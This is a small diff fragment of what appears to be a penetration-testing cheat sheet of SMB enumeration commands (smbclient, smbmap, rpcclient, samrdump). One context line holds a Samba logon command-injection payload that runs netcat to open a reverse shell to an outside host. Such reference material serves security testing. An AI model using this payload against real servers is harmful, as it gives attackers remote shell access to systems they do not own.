@@ -183,6 +183,7 @@ $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
+smb: \> !ls
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 $ rpcclient -U "" <IP address>
 $ samrdump.py <IP address>	
